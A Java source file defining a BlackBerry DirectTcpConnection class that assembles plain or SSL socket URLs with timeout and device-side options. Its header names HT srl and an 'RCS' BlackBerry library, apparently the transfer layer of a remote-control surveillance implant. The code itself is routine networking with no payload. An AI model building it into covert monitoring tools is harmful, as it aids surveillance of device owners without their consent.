/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SocketConnection.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTcpConnection.
 */
public final class DirectTcpConnection extends Connection {
    //#debug
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 3 * 60 * 1000;

    boolean deviceside;

    // Constructor
    /**
     * Instantiates a new direct tcp connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param deviceside_
     *            the deviceside_
     */
    public DirectTcpConnection(final String host_, final int port_,
            final boolean ssl_, final boolean deviceside_) {
        host = host_;
        port = port_;
        ssl = ssl_;
        deviceside = deviceside_;

        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        if (deviceside) {
            url += ";deviceside=true";
        } else {
            //url += ";deviceside=false";
            //#debug debug
            debug.trace("DirectTcpConnection: !deviceside");

        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        // #debug
        debug.error(string);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        // #debug debug
        debug.trace(string);
    }
}
